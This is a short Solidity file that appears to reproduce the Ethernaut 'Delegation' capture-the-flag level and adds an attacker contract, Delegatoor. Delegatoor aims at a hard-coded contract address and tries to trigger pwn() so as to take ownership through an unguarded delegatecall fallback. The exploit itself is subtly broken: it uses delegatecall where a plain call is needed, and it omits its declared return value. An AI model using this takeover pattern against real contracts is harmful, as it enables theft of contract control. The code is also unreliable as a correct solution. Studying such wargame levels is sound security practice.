// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;


contract Delegate {

  address public owner;

  constructor(address _owner) public {
    owner = _owner;
  }

  function pwn() public {
    owner = msg.sender;
  }
}

contract Delegation {

  address public owner;
  Delegate delegate;

  constructor(address _delegateAddress) public {
    delegate = Delegate(_delegateAddress);
    owner = msg.sender;
  }

  fallback() external {
    (bool result,) = address(delegate).delegatecall(msg.data);
    if (result) {
      this;
    }
  }
}


contract Delegatoor {

    function sendWithData() public returns (bool) {
        Delegation delegation = Delegation(0x49f53aEF9c8EcBDD3dE52b6C925a63e925b97c4C);
        (bool success,) = address(delegation).delegatecall(abi.encodeWithSignature("pwn()"));
        require(success);
    }
}